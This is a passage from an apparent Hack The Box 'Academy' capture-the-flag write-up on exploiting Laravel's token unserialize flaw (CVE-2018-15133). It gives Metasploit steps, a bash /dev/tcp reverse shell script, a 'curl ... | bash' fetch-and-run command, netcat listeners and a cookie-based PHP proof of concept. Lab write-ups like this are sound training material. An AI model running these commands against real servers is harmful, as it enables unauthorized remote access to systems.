## With Metasploit:

```bash
msf6 > use exploit/unix/http/laravel_token_unserialize_exec
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY <App_key>
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS <RHOSTS>
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set LHOST <LHOST
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set payload payload/generic/shell_reverse_tcp
msf6 exploit(unix/http/laravel_token_unserialize_exec) > run

[*] Started reverse TCP handler on 10.10.14.168:4444 
[*] Command shell session 1 opened (10.10.14.168:4444 -> 10.10.10.215:44787) at 2023-07-25 14:12:32 -0400

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@academy:/$ export TERM=xterm
```

## Without Metasploit:
### Automated approach:
#### Setting up the tool:
```bash
$ git clone https://github.com/aljavier/exploit_laravel_cve-2018-15133.git
$ cd exploit_laravel_cve-2018-15133
$ pip install -r requirements.txt
```

#### Reverse shell:
1. Create a bash script `rev.sh` with the following command:
```bash
/usr/bin/bash -i >& /dev/tcp/tun0_IP/9999 0>&1
```
2. Start a python HTTP server on port 80 serving the bash script `rev.sh`
```bash
python3 -m http.server 80
```
3. Start a netcat listener on port 9999:
```bash
nc -nlvp 9999
```
4. Run the following `curl` command via the automated tool, by providing the `APP_KEY` variable that can be found in the environmental variables at `http://dev-staging-01.academy.htb`
```bash
python3 pwn_laravel.py -c "curl http://tun0_IP/rev.sh | bash" http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
```
![2023-07-26 18_51_51-ParrotOS-HTB - VMware Workstation 17 Player (Non-commercial use only)](https://github.com/YounesTasra-R4z3rSw0rd/CTF-Scripts/assets/101610095/7f66a4c3-1f3a-41db-84a8-c180f69136b0)

### Manual approach:

1. Download the PHP POC script from [here](https://github.com/YounesTasra-R4z3rSw0rd/CTF-Scripts/blob/main/HTB/Academy/poc.php)
2. Open the poc.php file and make the necessary modification based on your environment
3. Start a netcat listener on a port of your choice (e.g.; 9999)
4. Run the following `curl` command:
```bash
curl -H "Cookie: laravel_session= $(php poc.php);" -v http://dev-staging-01.academy.htb
```
![2023-07-26 18_19_56-ParrotOS-HTB - VMware Workstation 17 Player (Non-commercial use only)](https://github.com/YounesTasra-R4z3rSw0rd/CTF-Scripts/assets/101610095/046a4e37-a707-419a-9e62-a98fb9aa15be)


